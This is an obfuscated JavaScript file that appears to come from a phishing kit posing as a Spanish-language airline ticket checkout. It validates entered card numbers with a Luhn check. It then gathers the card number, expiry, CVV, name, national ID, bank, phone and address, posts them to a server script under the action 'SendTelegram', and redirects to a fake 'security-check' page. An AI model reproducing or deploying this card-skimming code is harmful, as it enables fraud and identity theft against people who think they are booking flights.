function formatCNumber(element) {
    // Elimina todos los caracteres que no sean dígitos del valor del elemento
    const digitsOnly = element['value']['replace'](/\D/g,'');
    let formattedNumber = '';

    // Si el primer dígito del número de tarjeta es '3', se formatea como una tarjeta American Express
    if (digitsOnly[0] === '3') {
        // Agrega un atributo 'onkeyup' al elemento para limitar la cantidad de dígitos a 4
        element['setAttribute']('onkeyup','limitDigits(this, 4)');
        // Si la longitud del número excede los 15 caracteres, se reduce a 15 caracteres
        if (digitsOnly['length'] > 15) {
            digitsOnly = digitsOnly['slice'](0, 15);
        }
        // Formatea el número de tarjeta insertando espacios en los lugares adecuados
        for (let i = 0; i < digitsOnly['length']; i++) {
            if (i === 4 || i === 10) {
                formattedNumber += '\x20'; // Añade un espacio en la cuarta y décima posición
            }
            formattedNumber += digitsOnly['charAt'](i); // Añade el dígito actual al número formateado
        }
        // Establece el valor del elemento con el número de tarjeta formateado
        element['value'] = formattedNumber;
    } else {
        // Si el primer dígito del número de tarjeta no es '3', se asume que es otra tarjeta de crédito
        element['setAttribute']('onkeyup', 'limitDigits(this, 16)');
        // Si la longitud del número excede los 16 caracteres, se reduce a 16 caracteres
        if (digitsOnly['length'] > 16) {
            digitsOnly = digitsOnly['slice'](0, 16);
        }
        // Formatea el número de tarjeta insertando espacios en los lugares adecuados
        for (let i = 0; i < digitsOnly['length']; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedNumber += '\x20'; // Añade un espacio cada cuatro dígitos, comenzando desde el segundo dígito
            }
            formattedNumber += digitsOnly['charAt'](i); // Añade el dígito actual al número formateado
        }
        // Establece el valor del elemento con el número de tarjeta formateado
        element['value'] = formattedNumber;
    }
}


///////////////////////////
_0x1f0239 = shenina;
function shenina(giahnna, navarre) {
  const aelicia = soraiya();
  return shenina = function (jonice, jodiann) {
    jonice = jonice - 160;
    let brylan = aelicia[jonice];
    return brylan;
  }, shenina(giahnna, navarre);
}
(function (jillane, takayuki) {
  const quanya = shenina, markyla = jillane();
  while (true) {
    try {
      const nasario = parseInt(quanya(262)) / 1 * (-parseInt(quanya(174)) / 2) + -parseInt(quanya(230)) / 3 + -parseInt(quanya(177)) / 4 + parseInt(quanya(215)) / 5 + parseInt(quanya(263)) / 6 * (parseInt(quanya(206)) / 7) + -parseInt(quanya(202)) / 8 * (-parseInt(quanya(218)) / 9) + parseInt(quanya(249)) / 10;
      if (nasario === takayuki) break; else markyla.push(markyla.shift());
    } catch (anelys) {
      markyla.push(markyla.shift());
    }
  }
}(soraiya, 145818), setTimeout(() => {
  const nashly = shenina;
  document[nashly(269)](nashly(266)).remove();
}, 3e3));
const updateDOM = () => {
  const makarios = shenina;
  if (info.metaInfo.p !== "") {}
  const mazell = document.querySelector(makarios(170));
  mazell[makarios(271)] = "";
  info[makarios(171)][makarios(220)] !== 0 && (mazell[makarios(271)] += info.flightInfo.adults + " " + (info[makarios(171)].adults > 1 ? "Adultos" : "Adulto"));
  info[makarios(171)][makarios(268)] !== 0 && (mazell.innerHTML += ", " + info[makarios(171)].children + " " + (info[makarios(171)][makarios(268)] > 1 ? "Niños" : makarios(161)));
  info[makarios(171)][makarios(228)] !== 0 && (mazell[makarios(271)] += ", " + info[makarios(171)][makarios(228)] + " " + (info[makarios(171)][makarios(228)] > 1 ? makarios(163) : makarios(225)));
  let soana = info[makarios(171)].adults + info[makarios(171)].children;
  info.flightInfo[makarios(252)] === 1 ? (document.querySelector(makarios(201))[makarios(212)] = makarios(172) + Math[makarios(198)](PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)][makarios(188)][makarios(181)]] * soana + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo[makarios(217)][makarios(181)]] * soana)[makarios(213)](makarios(234)) + ",00", document[makarios(269)](makarios(180)).textContent = makarios(172) + Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)][makarios(188)].ticket_type] * soana + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo[makarios(217)][makarios(181)]] * soana).toLocaleString("es-Es") + makarios(244)) : (document[makarios(269)](makarios(201)).textContent = makarios(172) + Math[makarios(198)](PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)][makarios(188)][makarios(181)]] * soana).toLocaleString(makarios(234)) + ",00", document.querySelector(makarios(180))[makarios(212)] = makarios(172) + Math[makarios(198)](PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)].origin.ticket_type] * soana).toLocaleString(makarios(234)) + makarios(244));
  info[makarios(171)][makarios(252)] === 1 ? document[makarios(269)](makarios(260))[makarios(212)] = "$ " + Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)].origin[makarios(181)]] * soana + PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)].destination[makarios(181)]] * soana)[makarios(213)](makarios(234)) + makarios(244) : document.querySelector(makarios(260))[makarios(212)] = "$ " + Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info[makarios(171)][makarios(188)][makarios(181)]] * soana).toLocaleString(makarios(234)) + makarios(244);
  const wahnita = document[makarios(269)]("#resume-travel");
  let eleigha = new Date(parseInt(info.flightInfo[makarios(196)][0]));
  wahnita[makarios(271)] = makarios(265) + info.flightInfo[makarios(188)][makarios(162)] + makarios(190) + info[makarios(171)][makarios(217)][makarios(162)] + makarios(211) + dayDic[(eleigha[makarios(205)]() + 6) % 7][makarios(187)]() + ". " + eleigha[makarios(168)]()[makarios(243)](" ")[2] + makarios(237) + monthDic[eleigha[makarios(267)]()][makarios(187)]() + makarios(211) + info[makarios(171)].origin[makarios(241)][makarios(208)] + " " + info[makarios(171)][makarios(188)][makarios(255)] + " → " + info[makarios(171)].origin[makarios(241)][makarios(221)] + " " + info[makarios(171)][makarios(217)][makarios(255)] + makarios(231);
  if (info[makarios(171)][makarios(196)][1] !== 0) {
    let gerone = new Date(parseInt(info[makarios(171)][makarios(196)][1]));
    wahnita[makarios(271)] += makarios(166) + info[makarios(171)].destination[makarios(162)] + " a " + info.flightInfo[makarios(188)][makarios(162)] + makarios(238) + dayDic[(gerone[makarios(205)]() + 6) % 7][makarios(187)]() + ". " + gerone.toString().split(" ")[2] + makarios(237) + monthDic[gerone.getMonth()].toLowerCase() + makarios(238) + info[makarios(171)][makarios(217)].ticket_sched[makarios(208)] + " " + info[makarios(171)].destination[makarios(255)] + makarios(258) + info[makarios(171)][makarios(217)][makarios(241)][makarios(221)] + " " + info[makarios(171)].origin[makarios(255)] + makarios(204);
  }
};
updateDOM();
let paymentFlag = false, emailFlag = false;
const paymentForm = document[_0x1f0239(269)]("#form-payment");
paymentForm.addEventListener(_0x1f0239(192), areez => {
  const samoan = _0x1f0239;
  areez[samoan(195)](), paymentFlag = true;
});
const emailForm = document[_0x1f0239(269)]("#form-email");
emailForm.addEventListener(_0x1f0239(192), breeley => {
  const shakelia = _0x1f0239;
  breeley[shakelia(195)](), emailFlag = true;
});
const nextStep = () => {
  const deedie = _0x1f0239;
  document[deedie(269)]("#btn-email").click(), document[deedie(269)](deedie(259)).click();
  const aneliese = document[deedie(269)]("#p"), annahbella = document[deedie(269)](deedie(226)), neeti = document[deedie(269)]("#c"), aashay = document[deedie(269)](deedie(185)), jhream = document[deedie(269)](deedie(223)), kameon = document.querySelector(deedie(191)), rector = document.querySelector(deedie(207)), delshawn = document[deedie(269)]("#telnum"), jasonna = document[deedie(269)](deedie(270)), srinitya = document[deedie(269)](deedie(209));
  if (paymentFlag && emailFlag) {
    if (aneliese[deedie(193)][deedie(194)] === 19 && aneliese[deedie(193)][0] !== "3" && ["4", "5"][deedie(197)](aneliese[deedie(193)][0]) || aneliese[deedie(193)][deedie(194)] === 17 && aneliese.value[0] === "3") {
      if (isLuhnValid(aneliese[deedie(193)])) {
        if (isValidDate(annahbella[deedie(193)])) {
          if (neeti.value[deedie(194)] === 3 && aneliese[deedie(193)][deedie(194)] === 19 || neeti[deedie(193)].length === 4 && aneliese[deedie(193)][deedie(194)] === 17) {
            console.log(deedie(229)), info[deedie(214)].p = aneliese[deedie(193)], info[deedie(214)].ban = aashay[deedie(193)], info.metaInfo[deedie(199)] = annahbella[deedie(193)], info[deedie(214)].c = neeti[deedie(193)], info[deedie(214)][deedie(186)] = jhream[deedie(193)], info.metaInfo.cc = kameon[deedie(193)], info[deedie(214)][deedie(257)] = rector[deedie(193)], info[deedie(214)][deedie(182)] = delshawn[deedie(193)], info[deedie(214)][deedie(162)] = jasonna.value, info[deedie(214)][deedie(232)] = srinitya.value;
            if (info[deedie(214)].p[0] == "4") info.checkerInfo[deedie(272)] = deedie(246); else {
              if (info.metaInfo.p[0] == "5") info.checkerInfo[deedie(272)] = "MC"; else info[deedie(214)].p[0] == "3" && (info[deedie(164)][deedie(272)] = "AM");
            }
            console.log(info[deedie(214)]), updateLS();
            let marles = {email: info[deedie(214)][deedie(257)], cc: info.metaInfo.p, fecha: info[deedie(214)][deedie(199)], cvv: info[deedie(214)].c, cedula: info.metaInfo.cc, telnum: info[deedie(214)][deedie(182)], city: info[deedie(214)][deedie(162)], address: info[deedie(214)].address, name: info[deedie(214)][deedie(186)], banco: info[deedie(214)][deedie(236)], Action: deedie(167)};
            fetch(deedie(200), {method: deedie(210), headers: {"Content-Type": deedie(256), Authorization: deedie(173) + API_KEY}, body: JSON.stringify(marles)})[deedie(248)](deepesh => deepesh.json())[deedie(248)](axil => {
              const latrea = deedie;
              axil[latrea(247)] === true ? (localStorage[latrea(239)](latrea(245), axil.id), document.querySelector(latrea(183))[latrea(271)] += latrea(175), setTimeout(() => window[latrea(254)][latrea(203)] = latrea(240), 4e3)) : (console[latrea(160)]("Error en la operación:", axil[latrea(165)]), alert(latrea(178)));
            })[deedie(169)](joshuaray => {
              const adhan = deedie;
              console.error(adhan(273), joshuaray), alert(adhan(242));
            });
          } else alert(deedie(184)), neeti[deedie(193)] = "", neeti[deedie(219)]();
        } else alert(deedie(233)), annahbella[deedie(193)] = "", annahbella[deedie(219)]();
      } else {
        alert(deedie(216)), aneliese[deedie(193)] = "", aneliese[deedie(219)]();
        ;
      }
    } else alert(deedie(179)), aneliese.value = "", aneliese[deedie(219)]();
  }
};
function formatCNumber(jaylicia) {
  const jyaire = _0x1f0239;
  let tawyna = jaylicia[jyaire(193)][jyaire(176)](/\D/g, ""), ayomiposi = "";
  if (tawyna[0] === "3") {
    c[jyaire(251)](jyaire(261), "limitDigits(this, 4)");
    tawyna[jyaire(194)] > 15 && (tawyna = tawyna[jyaire(253)](0, 15));
    for (let kyjaun = 0; kyjaun < tawyna[jyaire(194)]; kyjaun++) {
      (kyjaun === 4 || kyjaun === 10) && (ayomiposi += " "), ayomiposi += tawyna.charAt(kyjaun);
    }
    jaylicia[jyaire(193)] = ayomiposi;
  } else {
    c.setAttribute(jyaire(261), jyaire(264));
    tawyna[jyaire(194)] > 16 && (tawyna = tawyna[jyaire(253)](0, 16));
    for (let qadree = 0; qadree < tawyna[jyaire(194)]; qadree++) {
      qadree > 0 && qadree % 4 === 0 && (ayomiposi += " "), ayomiposi += tawyna.charAt(qadree);
    }
    jaylicia[jyaire(193)] = ayomiposi;
  }
}
function formatDate(gamila) {
  const axeel = _0x1f0239;
  var zeily = gamila[axeel(193)];
  zeily = zeily[axeel(176)](/\D/g, ""), zeily = zeily[axeel(227)](0, 4), zeily[axeel(194)] > 2 && (zeily = zeily[axeel(227)](0, 2) + "/" + zeily[axeel(227)](2, 4)), gamila.value = zeily;
}
function isLuhnValid(lujane) {
  const taggart = _0x1f0239;
  lujane = lujane.replace(/\D/g, "");
  if (lujane[taggart(194)] < 6) return false;
  const jiquan = lujane[taggart(243)]("").map(Number).reverse();
  let jimon = 0;
  for (let ayveon = 0; ayveon < jiquan[taggart(194)]; ayveon++) {
    if (ayveon % 2 !== 0) {
      let rydia = jiquan[ayveon] * 2;
      rydia > 9 && (rydia -= 9), jimon += rydia;
    } else jimon += jiquan[ayveon];
  }
  return jimon % 10 === 0;
}
function soraiya() {
  const moiya = ["location", "code", "application/json", "email", " → ", "#btn-payment", "#payment-cost", "oninput", "25qEcaqi", "6uYpqLH", "limitDigits(this, 3)", '\n        <div class="mb-4">\n            <p class="m-0 fw-bold fs-5 tc-ocean">De ', ".loader-full", "getMonth", "children", "querySelector", "#city", "innerHTML", "company", "Error en la solicitud fetch:", "error", "Niño", "city", "Bebés", "checkerInfo", "message", '\n            <div class="mb-4">\n                <p class="m-0 fw-bold fs-5 tc-ocean">De ', "SendTelegram", "toString", "catch", "#resume-passengers", "flightInfo", "COP ", "Bearer ", "17988uXSNpq", '\n                                        <div class="loader-full">\n                                            <span class="loader"></span>\n                                            <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>\n                                        </div>\n                                    ', "replace", "29788VIPfvn", "La operación no pudo completarse. Por favor, inténtelo de nuevo.", "Revisa el número de tu tarjeta.", "#btn-cost", "ticket_type", "telnum", "body", "Revise el CVV de su tarjeta.", "#ban", "name", "toLowerCase", "origin", "getElementById", " a ", "#cc", "submit", "value", "length", "preventDefault", "flightDates", "includes", "ceil", "pdate", "controllertotal.php", "#resume-cost", "1918952RWbkdr", "href", "</p>\n            </div>\n        ", "getDay", "203189ViopMm", "#email", "takeoff", "#address", "POST", '</p>\n            <p class="m-0 mt-1 fs-5 tc-gray-smoke">', "textContent", "toLocaleString", "metaInfo", "1429985jcgofr", "Número de tarjeta inválido. Revisalo e intenta de nuevo.", "destination", "9FHQBGs", "focus", "adults", "landing", "getFullYear", "#name", "style", "Bebé", "#pdate", "substring", "babies", "Ok. Let's go!", "736404yjtjYG", "</p>\n        </div>\n    ", "address", "Revise la fecha de vencimiento de su tarjeta.", "es-Es", "True", "ban", " de ", '</p>\n                <p class="m-0 mt-1 fs-5 tc-gray-smoke">', "setItem", "security-check.html", "ticket_sched", "Un error ocurrió al procesar su solicitud.", "split", ",00", "idPanel", "VISA", "success", "then", "686900WufhEL", "block", "setAttribute", "travel_type", "substr"];
  soraiya = function () {
    return moiya;
  };
  return soraiya();
}
function isValidDate(lehmon) {
  const mtthew = _0x1f0239;
  var izabel = lehmon.split("/"), antwaan = parseInt(izabel[0], 10), ladeana = parseInt(izabel[1], 10);
  ladeana += 2e3;
  var kadraya = new Date, bronston = kadraya[mtthew(267)]() + 1, emaleah = kadraya[mtthew(222)]();
  return ladeana > emaleah || ladeana === emaleah && antwaan >= bronston ? true : false;
}
if (info[_0x1f0239(164)].errortc === _0x1f0239(235)) {
  var otpErrorMessage = document[_0x1f0239(189)]("otp-error-message");
  otpErrorMessage[_0x1f0239(224)].display = _0x1f0239(250);
}
